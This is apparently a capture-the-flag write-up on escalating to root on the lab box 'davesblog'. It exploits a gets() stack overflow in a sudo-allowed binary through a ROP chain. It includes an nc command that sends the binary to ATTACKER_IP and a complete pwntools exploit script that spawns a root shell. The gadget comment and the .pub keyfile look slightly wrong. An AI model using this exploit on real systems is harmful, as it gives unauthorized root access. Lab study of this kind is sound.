# Sudo Binary ROP via gets()

Privilege escalation through a sudo-allowed custom binary with a stack overflow in `gets()`. Used on: **davesblog**.

## Why It Works

The user could run `/uid_checker` as root without a password. The binary called `gets()` into a fixed-size stack buffer, had no stack canary, and no PIE. NX was enabled, so the exploit used a return-oriented chain to call existing PLT functions rather than injecting shellcode.

## Prerequisites

- `sudo -l` grants `NOPASSWD` execution of a custom binary.
- The binary is vulnerable to a stack overflow.
- Useful PLT entries and writable memory are available.
- The attacker can transfer the binary for local analysis.

## Discovery

```bash
sudo -l
strings /uid_checker
```

Transfer the binary for reversing:

```bash
nc -lvnp 4444 > uid_checker
cat /uid_checker | nc ATTACKER_IP 4444
```

Used on: **davesblog** - `/uid_checker` contained `gets()` and could be run as root.

## Exploit Skeleton

```python
from pwn import cyclic
from pwnlib.tubes.ssh import ssh
from pwnlib.util.packing import p64

offset = 88

payload = cyclic(offset)
payload += p64(0x400803) # pop r15; ret
payload += p64(0x601060) # .bss
payload += p64(0x4005b0) # gets()
payload += p64(0x400803) # pop r15; ret
payload += p64(0x601060) # .bss
payload += p64(0x400570) # system()

s = ssh(host='10.130.146.5', user='dave', keyfile='~/.ssh/id_rsa.pub')
p = s.process(['sudo', '/uid_checker'])
print(p.recv())
p.sendline(payload)
print(p.recv())
p.sendline("/bin/sh")
p.interactive(prompt='')
```

## Defensive Note

Avoid `NOPASSWD` sudo rules for custom binaries. Compile with stack canaries, PIE, full RELRO, and replace unsafe functions such as `gets()`.
